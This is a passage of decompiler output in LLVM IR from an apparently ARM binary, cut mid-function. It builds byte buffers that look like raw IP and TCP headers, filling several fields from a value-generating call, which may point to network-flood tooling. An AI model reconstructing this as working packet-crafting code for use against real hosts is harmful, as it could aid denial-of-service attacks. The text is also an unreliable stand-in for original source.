dec_label_pc_c8e4:                                ; preds = %dec_label_pc_c7a8
  %v0_c8e4 = call i32 @function_10bd8()
  %v1_c8e4 = trunc i32 %v0_c8e4 to i8
  store i32 %v0_c8e4, i32* %r0.global-to-local, align 4
  %v4_c8e8 = sdiv i32 %v0_c8e4, 256
  store i32 %v4_c8e8, i32* %r3.global-to-local, align 4
  %v1_c8ec = trunc i32 %v4_c8e8 to i8
  br label %dec_label_pc_c7d8

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8a4
  %v3_c8f8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c8f8, i32* %r4.global-to-local, align 4
  store i32 %v2_c4a0, i32* %r2.global-to-local, align 4
  %v3_c900 = mul i32 %v3_c8f8, 16
  store i32 %v3_c900, i32* %ip.global-to-local, align 4
  %v3_c904 = add i32 %v3_c900, %v2_c4a0
  %v4_c904 = inttoptr i32 %v3_c904 to i32*
  store i32 %storemerge35, i32* %v4_c904, align 4
  %v0_c908 = load i32, i32* @r6, align 4
  %v1_c908 = add i32 %v0_c908, 4
  %v2_c908 = inttoptr i32 %v1_c908 to i32*
  %v3_c908 = load i32, i32* %v2_c908, align 4
  %v1_c90c = udiv i32 %v3_c908, 256
  %v3_c910 = and i32 %v1_c90c, 65280
  %v1_c914 = and i32 %v3_c908, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_c914, i32* %r1.global-to-local, align 4
  %v3_c918 = mul i32 %v3_c908, 16777216
  %v4_c91c = udiv i32 %v3_c908, 16777216
  %v5_c91c = or i32 %v3_c910, %v4_c91c
  store i32 %v2_c4a0, i32* %r0.global-to-local, align 4
  %v4_c924 = mul i32 %v1_c914, 256
  %v5_c924 = or i32 %v4_c924, %v3_c918
  store i32 %v5_c924, i32* %r2.global-to-local, align 4
  %v1_c928 = load i32, i32* %ip.global-to-local, align 4
  %v2_c928 = add i32 %v1_c928, %v2_c4a0
  store i32 %v2_c928, i32* %ip.global-to-local, align 4
  %v2_c92c = or i32 %v5_c91c, %v5_c924
  store i32 %v2_c92c, i32* %r3.global-to-local, align 4
  %v2_c930 = add i32 %v2_c928, 4
  %v3_c930 = inttoptr i32 %v2_c930 to i32*
  store i32 %v2_c92c, i32* %v3_c930, align 4
  %v0_c934 = load i32, i32* @r6, align 4
  %v1_c934 = add i32 %v0_c934, 8
  %v2_c934 = inttoptr i32 %v1_c934 to i32*
  %v3_c934 = load i32, i32* %v2_c934, align 4
  store i32 %v3_c934, i32* %r0.global-to-local, align 4
  %v1_c93c = and i32 %v3_c934, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_c93c, i32* %r1.global-to-local, align 4
  %v3_c940 = mul i32 %v3_c934, 16777216
  %v1_c938 = udiv i32 %v3_c934, 256
  %v3_c944 = and i32 %v1_c938, 65280
  %v4_c948 = mul i32 %v1_c93c, 256
  %v5_c948 = or i32 %v4_c948, %v3_c940
  store i32 %v5_c948, i32* %r2.global-to-local, align 4
  %v4_c94c = udiv i32 %v3_c934, 16777216
  %v5_c94c = or i32 %v3_c944, %v4_c94c
  %v2_c950 = or i32 %v5_c94c, %v5_c948
  store i32 %v2_c950, i32* %r3.global-to-local, align 4
  %v1_c954 = load i32, i32* %ip.global-to-local, align 4
  %v2_c954 = add i32 %v1_c954, 8
  %v3_c954 = inttoptr i32 %v2_c954 to i32*
  store i32 %v2_c950, i32* %v3_c954, align 4
  %v0_c958 = load i32, i32* @r6, align 4
  %v1_c958 = inttoptr i32 %v0_c958 to i32*
  %v2_c958 = load i32, i32* %v1_c958, align 4
  %v3_c95c = udiv i32 %v2_c958, 65536
  store i32 %v3_c95c, i32* %r2.global-to-local, align 4
  %v3_c9606 = udiv i32 %v2_c958, 16777216
  store i32 %v3_c9606, i32* %r1.global-to-local, align 4
  %v0_c964 = load i32, i32* @r5, align 4
  %v3_c964 = sdiv i32 %v0_c964, 256
  store i32 %v3_c964, i32* %r3.global-to-local, align 4
  %v1_c968 = trunc i32 %v3_c964 to i8
  %v2_c968 = load i32, i32* %ip.global-to-local, align 4
  %v3_c968 = add i32 %v2_c968, 15
  %v4_c968 = inttoptr i32 %v3_c968 to i8*
  store i8 %v1_c968, i8* %v4_c968, align 1
  %v0_c96c = load i32, i32* %r1.global-to-local, align 4
  %v1_c96c = trunc i32 %v0_c96c to i8
  %v2_c96c = load i32, i32* %ip.global-to-local, align 4
  %v3_c96c = add i32 %v2_c96c, 13
  %v4_c96c = inttoptr i32 %v3_c96c to i8*
  store i8 %v1_c96c, i8* %v4_c96c, align 1
  %v0_c970 = load i32, i32* %r2.global-to-local, align 4
  %v1_c970 = trunc i32 %v0_c970 to i8
  %v2_c970 = load i32, i32* %ip.global-to-local, align 4
  %v3_c970 = add i32 %v2_c970, 12
  %v4_c970 = inttoptr i32 %v3_c970 to i8*
  store i8 %v1_c970, i8* %v4_c970, align 1
  %v0_c974 = load i32, i32* @r5, align 4
  %v1_c974 = trunc i32 %v0_c974 to i8
  %v2_c974 = load i32, i32* %ip.global-to-local, align 4
  %v3_c974 = add i32 %v2_c974, 14
  %v4_c974 = inttoptr i32 %v3_c974 to i8*
  store i8 %v1_c974, i8* %v4_c974, align 1
  %v0_c978 = load i32, i32* @sl, align 4
  store i32 %v0_c978, i32* %r0.global-to-local, align 4
  %v1_c97c = call i32 @_malloc(i32 %v0_c978)
  store i32 %v1_c97c, i32* %r0.global-to-local, align 4
  store i32 %v2_c4b0, i32* %r1.global-to-local, align 4
  %v3_c984 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c984, i32* %r2.global-to-local, align 4
  %v2_c988 = load i32, i32* %r4.global-to-local, align 4
  %v5_c988 = mul i32 %v2_c988, 4
  %v6_c988 = add i32 %v5_c988, %v2_c4b0
  %v7_c988 = inttoptr i32 %v6_c988 to i32*
  store i32 %v1_c97c, i32* %v7_c988, align 4
  %v0_c98c = load i32, i32* %r1.global-to-local, align 4
  %v1_c98c = load i32, i32* %r2.global-to-local, align 4
  %v4_c98c = mul i32 %v1_c98c, 4
  %v5_c98c = add i32 %v4_c98c, %v0_c98c
  %v6_c98c = inttoptr i32 %v5_c98c to i32*
  %v7_c98c = load i32, i32* %v6_c98c, align 4
  store i32 %v7_c98c, i32* @r4, align 4
  %v1_c990 = inttoptr i32 %v7_c98c to i8*
  %v2_c990 = load i8, i8* %v1_c990, align 1
  %tmp115 = urem i8 %v2_c990, 16
  %v1_c994 = zext i8 %tmp115 to i32
  %v1_c998 = or i32 %v1_c994, 64
  store i32 %v1_c998, i32* %r3.global-to-local, align 4
  %v1_c99c = trunc i32 %v1_c998 to i8
  store i8 %v1_c99c, i8* %v1_c990, align 1
  %v0_c9a0 = load i32, i32* @sl, align 4
  %v3_c9a0 = mul i32 %v0_c9a0, 65536
  store i32 %v3_c9a0, i32* %r2.global-to-local, align 4
  %v0_c9a4 = load i32, i32* @r4, align 4
  %v1_c9a4 = inttoptr i32 %v0_c9a4 to i8*
  %v2_c9a4 = load i8, i8* %v1_c9a4, align 1
  %v1_c9ac = urem i32 %v0_c9a0, 256
  %tmp90 = udiv i32 %v0_c9a0, 256
  %v3_c9b0 = urem i32 %tmp90, 256
  %v1_c9b4 = and i8 %v2_c9a4, -16
  %v4_c9b8 = mul nuw nsw i32 %v1_c9ac, 256
  %v5_c9b8 = or i32 %v4_c9b8, %v3_c9b0
  store i32 %v5_c9b8, i32* %r2.global-to-local, align 4
  %v1_c9bc = or i8 %v1_c9b4, 5
  store i32 %v1_c530, i32* %ip.global-to-local, align 4
  store i32 %v1_c9ac, i32* %r3.global-to-local, align 4
  store i8 %v1_c9bc, i8* %v1_c9a4, align 1
  %v0_c9cc = load i32, i32* %r3.global-to-local, align 4
  %v1_c9cc = trunc i32 %v0_c9cc to i8
  %v2_c9cc = load i32, i32* @r4, align 4
  %v3_c9cc = add i32 %v2_c9cc, 3
  %v4_c9cc = inttoptr i32 %v3_c9cc to i8*
  store i8 %v1_c9cc, i8* %v4_c9cc, align 1
  store i32 %v4_c9d0, i32* %r3.global-to-local, align 4
  %v0_c9d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_c9d4 = icmp eq i32 %v0_c9d4, 0
  store i1 %v2_c9d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_c800, i32* %r0.global-to-local, align 4
  store i32 %v3_c808, i32* %r1.global-to-local, align 4
  %v2_c9e0 = load i32, i32* @r4, align 4
  %v3_c9e0 = add i32 %v2_c9e0, 1
  %v4_c9e0 = inttoptr i32 %v3_c9e0 to i8*
  store i8 %v1_c9e0, i8* %v4_c9e0, align 1
  store i32 %v4_c9e4, i32* %ip.global-to-local, align 4
  %v0_c9e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9e8, label %bb92, label %bb91

bb91:                                             ; preds = %dec_label_pc_c8f8
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %dec_label_pc_c8f8, %bb91
  %v0_c9ec = load i32, i32* %r2.global-to-local, align 4
  %v1_c9ec = trunc i32 %v0_c9ec to i8
  %v2_c9ec = load i32, i32* @r4, align 4
  %v3_c9ec = add i32 %v2_c9ec, 2
  %v4_c9ec = inttoptr i32 %v3_c9ec to i8*
  store i8 %v1_c9ec, i8* %v4_c9ec, align 1
  %v0_c9f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9f0, label %.thread10, label %bb93

bb93:                                             ; preds = %bb92
  %v1_c9f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_c9f0 = trunc i32 %v1_c9f0 to i8
  %v3_c9f0 = load i32, i32* @r4, align 4
  %v4_c9f0 = add i32 %v3_c9f0, 6
  %v5_c9f0 = inttoptr i32 %v4_c9f0 to i8*
  store i8 %v2_c9f0, i8* %v5_c9f0, align 1
  %v0_c9f4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c9f4.pr, label %.thread10, label %bb94

bb94:                                             ; preds = %bb93
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %bb92, %bb93, %bb94
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_c9fc = load i32, i32* %ip.global-to-local, align 4
  %v1_c9fc = trunc i32 %v0_c9fc to i8
  %v2_c9fc = load i32, i32* @r4, align 4
  %v3_c9fc = add i32 %v2_c9fc, 8
  %v4_c9fc = inttoptr i32 %v3_c9fc to i8*
  store i8 %v1_c9fc, i8* %v4_c9fc, align 1
  %v0_ca00 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca00 = trunc i32 %v0_ca00 to i8
  %v2_ca00 = load i32, i32* @r4, align 4
  %v3_ca00 = add i32 %v2_ca00, 9
  %v4_ca00 = inttoptr i32 %v3_ca00 to i8*
  store i8 %v1_ca00, i8* %v4_ca00, align 1
  %v0_ca04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ca04, label %bb96, label %bb95

bb95:                                             ; preds = %.thread10
  %v1_ca04 = load i32, i32* %r2.global-to-local, align 4
  %v2_ca04 = trunc i32 %v1_ca04 to i8
  %v3_ca04 = load i32, i32* @r4, align 4
  %v4_ca04 = add i32 %v3_ca04, 7
  %v5_ca04 = inttoptr i32 %v4_ca04 to i8*
  store i8 %v2_ca04, i8* %v5_ca04, align 1
  br label %bb96

bb96:                                             ; preds = %.thread10, %bb95
  %v2_ca0c = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_ca0c, i32* %r3.global-to-local, align 4
  %v1_ca10 = load i32, i32* @r4, align 4
  %v2_ca10 = add i32 %v1_ca10, 12
  %v3_ca10 = inttoptr i32 %v2_ca10 to i32*
  store i32 %v2_ca0c, i32* %v3_ca10, align 4
  %v0_ca14 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca14 = trunc i32 %v0_ca14 to i8
  %v2_ca14 = load i32, i32* @r4, align 4
  %v3_ca14 = add i32 %v2_ca14, 4
  %v4_ca14 = inttoptr i32 %v3_ca14 to i8*
  store i8 %v1_ca14, i8* %v4_ca14, align 1
  %v3_ca18 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ca18, i32* %r2.global-to-local, align 4
  store i32 %v2_c4a0, i32* %r0.global-to-local, align 4
  %v4_ca20 = mul i32 %v3_ca18, 16
  %v5_ca20 = add i32 %v4_ca20, %v2_c4a0
  %v6_ca20 = inttoptr i32 %v5_ca20 to i32*
  %v7_ca20 = load i32, i32* %v6_ca20, align 4
  store i32 %v7_ca20, i32* %r3.global-to-local, align 4
  %v0_ca24 = load i32, i32* %r1.global-to-local, align 4
  %v1_ca24 = trunc i32 %v0_ca24 to i8
  %v2_ca24 = load i32, i32* @r4, align 4
  %v3_ca24 = add i32 %v2_ca24, 5
  %v4_ca24 = inttoptr i32 %v3_ca24 to i8*
  store i8 %v1_ca24, i8* %v4_ca24, align 1
  %v0_ca28 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca28 = load i32, i32* @r4, align 4
  %v2_ca28 = add i32 %v1_ca28, 16
  %v3_ca28 = inttoptr i32 %v2_ca28 to i32*
  store i32 %v0_ca28, i32* %v3_ca28, align 4
  %v0_ca2c = load i32, i32* %r2.global-to-local, align 4
  %v3_ca2c = mul i32 %v0_ca2c, 16
  %v1_ca30 = load i32, i32* %r0.global-to-local, align 4
  %v2_ca30 = add i32 %v1_ca30, %v3_ca2c
  store i32 %v2_ca30, i32* %r2.global-to-local, align 4
  %v1_ca34 = add i32 %v2_ca30, 13
  %v2_ca34 = inttoptr i32 %v1_ca34 to i8*
  %v3_ca34 = load i8, i8* %v2_ca34, align 1
  %v4_ca34 = zext i8 %v3_ca34 to i32
  store i32 %v4_ca34, i32* %r1.global-to-local, align 4
  %v1_ca38 = add i32 %v2_ca30, 12
  %v2_ca38 = inttoptr i32 %v1_ca38 to i8*
  %v3_ca38 = load i8, i8* %v2_ca38, align 1
  %v4_ca38 = zext i8 %v3_ca38 to i32
  %v4_ca3c = mul nuw nsw i32 %v4_ca34, 256
  %v5_ca3c = or i32 %v4_ca38, %v4_ca3c
  store i32 %v5_ca3c, i32* %r3.global-to-local, align 4
  %v2_ca40 = load i32, i32* @r4, align 4
  %v3_ca40 = add i32 %v2_ca40, 20
  %v4_ca40 = inttoptr i32 %v3_ca40 to i8*
  store i8 %v3_ca38, i8* %v4_ca40, align 1
  %v0_ca44 = load i32, i32* @r4, align 4
  %v1_ca44 = add i32 %v0_ca44, 20
  store i32 %v1_ca44, i32* @r6, align 4
  %v0_ca48 = load i32, i32* %r3.global-to-local, align 4
  %v3_ca48 = sdiv i32 %v0_ca48, 256
  store i32 %v3_ca48, i32* %r3.global-to-local, align 4
  %v1_ca4c = trunc i32 %v3_ca48 to i8
  %v3_ca4c = add i32 %v0_ca44, 21
  %v4_ca4c = inttoptr i32 %v3_ca4c to i8*
  store i8 %v1_ca4c, i8* %v4_ca4c, align 1
  %v0_ca50 = load i32, i32* @r6, align 4
  %v1_ca50 = add i32 %v0_ca50, 13
  %v2_ca50 = inttoptr i32 %v1_ca50 to i8*
  %v3_ca50 = load i8, i8* %v2_ca50, align 1
  %v4_ca50 = zext i8 %v3_ca50 to i32
  store i32 %v4_ca50, i32* %r3.global-to-local, align 4
  %v0_ca54 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca54 = add i32 %v0_ca54, 8
  %v2_ca54 = inttoptr i32 %v1_ca54 to i32*
  %v3_ca54 = load i32, i32* %v2_ca54, align 4
  store i32 %v3_ca54, i32* %r1.global-to-local, align 4
  %v1_ca58 = or i32 %v4_ca50, 1
  store i32 %v1_ca58, i32* %r3.global-to-local, align 4
  %v1_ca5c = add i32 %v0_ca54, 15
  %v2_ca5c = inttoptr i32 %v1_ca5c to i8*
  %v3_ca5c = load i8, i8* %v2_ca5c, align 1
  %v4_ca5c = zext i8 %v3_ca5c to i32
  store i32 %v4_ca5c, i32* %ip.global-to-local, align 4
  %v1_ca60 = add i32 %v0_ca54, 14
  %v2_ca60 = inttoptr i32 %v1_ca60 to i8*
  %v3_ca60 = load i8, i8* %v2_ca60, align 1
  %v4_ca60 = zext i8 %v3_ca60 to i32
  store i32 %v4_ca60, i32* %r0.global-to-local, align 4
  %v2_ca64 = add i32 %v0_ca50, 4
  %v3_ca64 = inttoptr i32 %v2_ca64 to i32*
  store i32 %v3_ca54, i32* %v3_ca64, align 4
  %v0_ca68 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca68 = add i32 %v0_ca68, 4
  %v2_ca68 = inttoptr i32 %v1_ca68 to i32*
  %v3_ca68 = load i32, i32* %v2_ca68, align 4
  store i32 %v3_ca68, i32* %lr.global-to-local, align 4
  %v0_ca6c = load i32, i32* %r3.global-to-local, align 4
  %v1_ca6c = trunc i32 %v0_ca6c to i8
  %v2_ca6c = load i32, i32* @r6, align 4
  %v3_ca6c = add i32 %v2_ca6c, 13
  %v4_ca6c = inttoptr i32 %v3_ca6c to i8*
  store i8 %v1_ca6c, i8* %v4_ca6c, align 1
  %v0_ca70 = load i32, i32* @r6, align 4
  %v1_ca70 = add i32 %v0_ca70, 12
  %v2_ca70 = inttoptr i32 %v1_ca70 to i8*
  %v3_ca70 = load i8, i8* %v2_ca70, align 1
  %v4_ca70 = zext i8 %v3_ca70 to i32
  store i32 %v4_ca70, i32* %r2.global-to-local, align 4
  %v1_ca74 = add i32 %v0_ca70, 13
  %v2_ca74 = inttoptr i32 %v1_ca74 to i8*
  %v3_ca74 = load i8, i8* %v2_ca74, align 1
  %v4_ca74 = zext i8 %v3_ca74 to i32
  %v0_ca78 = load i32, i32* %r0.global-to-local, align 4
  %v1_ca78 = load i32, i32* %ip.global-to-local, align 4
  %v4_ca78 = mul i32 %v1_ca78, 256
  %v5_ca78 = or i32 %v4_ca78, %v0_ca78
  store i32 %v5_ca78, i32* %r0.global-to-local, align 4
  %tmp116 = urem i8 %v3_ca70, 16
  %v1_ca7c = zext i8 %tmp116 to i32
  %v3_ca80 = sdiv i32 %v5_ca78, 256
  store i32 %v3_ca80, i32* %r1.global-to-local, align 4
  %v1_ca84 = or i32 %v1_ca7c, 128
  store i32 %v1_ca84, i32* %r2.global-to-local, align 4
  %v1_ca88 = or i32 %v4_ca74, 16
  store i32 %v1_ca88, i32* %r3.global-to-local, align 4
  %v1_ca8c = trunc i32 %v3_ca80 to i8
  %v3_ca8c = add i32 %v0_ca70, 3
  %v4_ca8c = inttoptr i32 %v3_ca8c to i8*
  store i8 %v1_ca8c, i8* %v4_ca8c, align 1
  %v0_ca90 = load i32, i32* %r2.global-to-local, align 4
  %v1_ca90 = trunc i32 %v0_ca90 to i8
  %v2_ca90 = load i32, i32* @r6, align 4
  %v3_ca90 = add i32 %v2_ca90, 12
  %v4_ca90 = inttoptr i32 %v3_ca90 to i8*
  store i8 %v1_ca90, i8* %v4_ca90, align 1
  %v0_ca94 = load i32, i32* %r3.global-to-local, align 4
  %v1_ca94 = trunc i32 %v0_ca94 to i8
  %v2_ca94 = load i32, i32* @r6, align 4
  %v3_ca94 = add i32 %v2_ca94, 13
  %v4_ca94 = inttoptr i32 %v3_ca94 to i8*
  store i8 %v1_ca94, i8* %v4_ca94, align 1
  %v0_ca98 = load i32, i32* %lr.global-to-local, align 4
  %v1_ca98 = load i32, i32* @r6, align 4
  %v2_ca98 = add i32 %v1_ca98, 8
  %v3_ca98 = inttoptr i32 %v2_ca98 to i32*
  store i32 %v0_ca98, i32* %v3_ca98, align 4
  %v0_ca9c = load i32, i32* %r0.global-to-local, align 4
  %v1_ca9c = trunc i32 %v0_ca9c to i8
  %v2_ca9c = load i32, i32* @r6, align 4
  %v3_ca9c = add i32 %v2_ca9c, 2
  %v4_ca9c = inttoptr i32 %v3_ca9c to i8*
  store i8 %v1_ca9c, i8* %v4_ca9c, align 1
  %v0_caa0 = call i32 @function_10bd8()
  %v1_caa0 = trunc i32 %v0_caa0 to i8
  store i32 %v0_caa0, i32* %r0.global-to-local, align 4
  store i32 %v1_c568, i32* %r1.global-to-local, align 4
  %v0_caa8 = load i32, i32* @r6, align 4
  %v1_caa8 = add i32 %v0_caa8, 13
  %v2_caa8 = inttoptr i32 %v1_caa8 to i8*
  %v3_caa8 = load i8, i8* %v2_caa8, align 1
  %v4_caa8 = zext i8 %v3_caa8 to i32
  store i32 %v1_caac, i32* %r2.global-to-local, align 4
  %v1_cab0 = and i32 %v4_caa8, 223
  %v5_cab4 = or i32 %v1_cab0, %v4_cab4
  store i32 %v5_cab4, i32* %r3.global-to-local, align 4
  %v1_cab8 = trunc i32 %v5_cab4 to i8
  store i8 %v1_cab8, i8* %v2_caa8, align 1
  store i32 %v1_c588, i32* %ip.global-to-local, align 4
  %v0_cac0 = load i32, i32* @r6, align 4
  %v1_cac0 = add i32 %v0_cac0, 13
  %v2_cac0 = inttoptr i32 %v1_cac0 to i8*
  %v3_cac0 = load i8, i8* %v2_cac0, align 1
  %v4_cac0 = zext i8 %v3_cac0 to i32
  store i32 %v1_cac4, i32* %r3.global-to-local, align 4
  %v1_cac8 = and i32 %v4_cac0, 239
  %v5_cacc = or i32 %v1_cac8, %v4_cacc
  store i32 %v5_cacc, i32* %r2.global-to-local, align 4
  %v1_cad0 = trunc i32 %v5_cacc to i8
  store i8 %v1_cad0, i8* %v2_cac0, align 1
  store i32 %v1_c5a8, i32* %r1.global-to-local, align 4
  %v0_cad8 = load i32, i32* @r6, align 4
  %v1_cad8 = add i32 %v0_cad8, 13
  %v2_cad8 = inttoptr i32 %v1_cad8 to i8*
  %v3_cad8 = load i8, i8* %v2_cad8, align 1
  %v4_cad8 = zext i8 %v3_cad8 to i32
  store i32 %v1_cadc, i32* %r2.global-to-local, align 4
  %v1_cae0 = and i32 %v4_cad8, 247
  %v5_cae4 = or i32 %v1_cae0, %v4_cae4
  store i32 %v5_cae4, i32* %r3.global-to-local, align 4
  %v1_cae8 = trunc i32 %v5_cae4 to i8
  store i8 %v1_cae8, i8* %v2_cad8, align 1
  store i32 %v1_c5c8, i32* %ip.global-to-local, align 4
  %v0_caf0 = load i32, i32* @r6, align 4
  %v1_caf0 = add i32 %v0_caf0, 13
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v4_caf0 = zext i8 %v3_caf0 to i32
  store i32 %v1_caf4, i32* %r3.global-to-local, align 4
  %v1_caf8 = and i32 %v4_caf0, 251
  %v5_cafc = or i32 %v1_caf8, %v4_cafc
  store i32 %v5_cafc, i32* %r2.global-to-local, align 4
  %v1_cb00 = trunc i32 %v5_cafc to i8
  store i8 %v1_cb00, i8* %v2_caf0, align 1
  store i32 %v1_c5e8, i32* %r1.global-to-local, align 4
  %v0_cb08 = load i32, i32* @r6, align 4
  %v1_cb08 = add i32 %v0_cb08, 13
  %v2_cb08 = inttoptr i32 %v1_cb08 to i8*
  %v3_cb08 = load i8, i8* %v2_cb08, align 1
  %v4_cb08 = zext i8 %v3_cb08 to i32
  store i32 %v1_cb0c, i32* %r2.global-to-local, align 4
  %v1_cb10 = and i32 %v4_cb08, 253
  %v4_cb14 = or i32 %v1_cb10, %v3_cb14
  store i32 %v4_cb14, i32* %r3.global-to-local, align 4
  %v1_cb18 = trunc i32 %v4_cb14 to i8
  store i8 %v1_cb18, i8* %v2_cb08, align 1
  %v0_cb1c = load i32, i32* @r6, align 4
  %v1_cb1c = add i32 %v0_cb1c, 13
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v4_cb1c = zext i8 %v3_cb1c to i32
  %v0_cb20 = load i32, i32* @r8, align 4
  %v1_cb20 = urem i32 %v0_cb20, 2
  %v1_cb24 = and i32 %v4_cb1c, 254
  store i32 %v1_cb24, i32* %r2.global-to-local, align 4
  %v4_cb2837 = udiv i32 %v0_caa0, 256
  %v2_cb2c = or i32 %v1_cb24, %v1_cb20
  store i32 %v2_cb2c, i32* %r3.global-to-local, align 4
  %v1_cb30 = trunc i32 %v4_cb2837 to i8
  %v3_cb30 = add i32 %v0_cb1c, 15
  %v4_cb30 = inttoptr i32 %v3_cb30 to i8*
  store i8 %v1_cb30, i8* %v4_cb30, align 1
  %v3_cb34 = load i32, i32* @r6, align 4
  %v4_cb34 = add i32 %v3_cb34, 14
  %v5_cb34 = inttoptr i32 %v4_cb34 to i8*
  store i8 %v1_caa0, i8* %v5_cb34, align 1
  %v0_cb38 = load i32, i32* %r3.global-to-local, align 4
  %v1_cb38 = trunc i32 %v0_cb38 to i8
  %v2_cb38 = load i32, i32* @r6, align 4
  %v3_cb38 = add i32 %v2_cb38, 13
  %v4_cb38 = inttoptr i32 %v3_cb38 to i8*
  store i8 %v1_cb38, i8* %v4_cb38, align 1
  %v0_cb3c = load i32, i32* @r4, align 4
  %v1_cb3c = add i32 %v0_cb3c, 40
  store i32 %v1_cb3c, i32* %r0.global-to-local, align 4
  %v0_cb40 = load i32, i32* @sb, align 4
  store i32 %v0_cb40, i32* @r1, align 4
  %v1_cb44 = inttoptr i32 %v1_cb3c to i8*
  %v2_cb44 = call i32 @function_10db4(i8* %v1_cb44)
  store i32 %v2_cb44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cb48

dec_label_pc_cb48:                                ; preds = %dec_label_pc_c6d8, %bb96
  %v3_cb48 = load i32, i32* %stack_var_-40, align 4
  %v1_cb4c = add i32 %v3_cb48, 1
  store i32 %v1_cb4c, i32* %r3.global-to-local, align 4
  %v1_cb50 = load i32, i32* @fp, align 4
  %v9_cb50 = icmp eq i32 %v1_cb4c, %v1_cb50
  store i1 %v9_cb50, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cb4c, i32* %stack_var_-40, align 4
  %v5_cb58 = icmp slt i32 %v1_cb4c, %v1_cb50
  br i1 %v5_cb58, label %dec_label_pc_c6bc, label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb48, %.thread27
  %v0_cb6421 = phi i32 [ %v0_c690, %.thread27 ], [ %v1_cb50, %dec_label_pc_cb48 ]
  %v0_cb5c = load i32, i32* @sb, align 4
  %v1_cb5c = add i32 %v0_cb5c, 40
  store i32 %v1_cb5c, i32* @sl, align 4
  %v1_cb60 = add i32 %v0_cb5c, 20
  store i32 %v1_cb60, i32* @r7, align 4
  %v2_ccdc = icmp eq i32 %v1_c640, 0
  %v6_cb90 = inttoptr i32 %v2_c4b0 to i32*
  %v3_cb98 = icmp eq i32 %v3_c698, 65535
  br label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cbc0, %dec_label_pc_cb5c
  %v0_cb64 = phi i32 [ %v1_cca0, %dec_label_pc_cbc0 ], [ %v0_cb6421, %dec_label_pc_cb5c ]
  %v2_cb64 = icmp eq i32 %v0_cb64, 0
  store i1 %v2_cb64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_cb64, 1
  br label %dec_label_pc_cb6c

dec_label_pc_cb6c:                                ; preds = %dec_label_pc_cb6c, %dec_label_pc_cb64
  br i1 %tmp97, label %dec_label_pc_cb6c, label %dec_label_pc_cb70

dec_label_pc_cb70:                                ; preds = %dec_label_pc_cb6c
  %v0_cb70 = load i32, i32* @r7, align 4
  %tmp98 = mul i32 %v0_cb70, 256
  %v1_cb78 = and i32 %tmp98, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  %tmp99 = udiv i32 %v0_cb70, 256
  %v4_cb7c = urem i32 %tmp99, 256
  %v5_cb7c = or i32 %v4_cb7c, %v1_cb78
  store i32 %v5_cb7c, i32* @r8, align 4
  store i32 %v2_c4b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_c698, i32* %ip.global-to-local, align 4
  %v7_cb90 = load i32, i32* %v6_cb90, align 4
  store i32 %v7_cb90, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_cb98, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_cba4 = add i32 %v7_cb90, 20
  store i32 %v1_cba4, i32* @r5, align 4
  br i1 %v3_cb98, label %dec_label_pc_cccc, label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %dec_label_pc_ccac, %dec_label_pc_cb70
  %v0_cbb8 = phi i32 [ %v7_ccb8, %dec_label_pc_ccac ], [ %v7_cb90, %dec_label_pc_cb70 ]
  store i1 %v2_ccdc, i1* %cpsr_z.global-to-local, align 1
  %v0_cbb4 = load i32, i32* @sb, align 4
  store i32 %v0_cbb4, i32* @r1, align 4
  %v1_cbb8 = add i32 %v0_cbb8, 40
  store i32 %v1_cbb8, i32* %r0.global-to-local, align 4
  br i1 %v2_ccdc, label %dec_label_pc_cbc0, label %dec_label_pc_ccf0

dec_label_pc_cbc0:                                ; preds = %dec_label_pc_cbac, %dec_label_pc_cccc, %dec_label_pc_ccf0
  %v2_cbc0 = phi i32 [ %v0_cbb8, %dec_label_pc_cbac ], [ %v0_cce4, %dec_label_pc_cccc ], [ %v2_cbc0.pre, %dec_label_pc_ccf0 ]
  %v0_cbc0 = load i32, i32* @r6, align 4
  %v1_cbc0 = trunc i32 %v0_cbc0 to i8
  %v3_cbc0 = add i32 %v2_cbc0, 10
  %v4_cbc0 = inttoptr i32 %v3_cbc0 to i8*
  store i8 %v1_cbc0, i8* %v4_cbc0, align 1
  %v0_cbc4 = load i32, i32* @r6, align 4
  %v1_cbc4 = trunc i32 %v0_cbc4 to i8
  %v2_cbc4 = load i32, i32* @r4, align 4
  %v3_cbc4 = add i32 %v2_cbc4, 11
